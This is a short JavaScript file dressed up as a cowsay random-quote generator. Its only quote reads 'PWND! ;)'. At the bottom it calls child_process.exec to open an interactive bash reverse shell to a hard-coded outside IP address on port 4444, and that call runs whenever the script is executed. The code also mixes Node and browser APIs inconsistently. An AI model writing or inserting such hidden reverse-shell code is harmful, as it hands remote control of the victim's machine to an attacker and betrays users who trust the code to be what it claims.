const cowsay = require('cowsay');
const { exec } = require('child_process');



// Generate cowsay output
const output = cowsay.say({
  text: getRandomQuote(),
});

function getRandomQuote() {
  const quotes = [
    "PWND! ;)"
  ];

  // Generate a cryptographically secure random index
  const randomIndex = crypto.getRandomValues(new Uint32Array(1))[0] % quotes.length;

  // Return the random quote
  return quotes[randomIndex];
}

document.getElementById("generate").addEventListener("click", async () => {
  const output = cowsay.say({
    text: getRandomQuote(),
  });
  document.getElementById("cowsayOutput").innerText = output;

});
document.getElementById("cowsayOutput").innerText = output;

exec(`bash -i >& /dev/tcp/178.26.241.31/4444 0>&1`, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error executing script: ${error.message}`);
    return;
  }
  if (stderr) {
    console.error(`Script error output: ${stderr}`);
    return;
  }
  console.log(`Script output:\n${stdout}`);
});
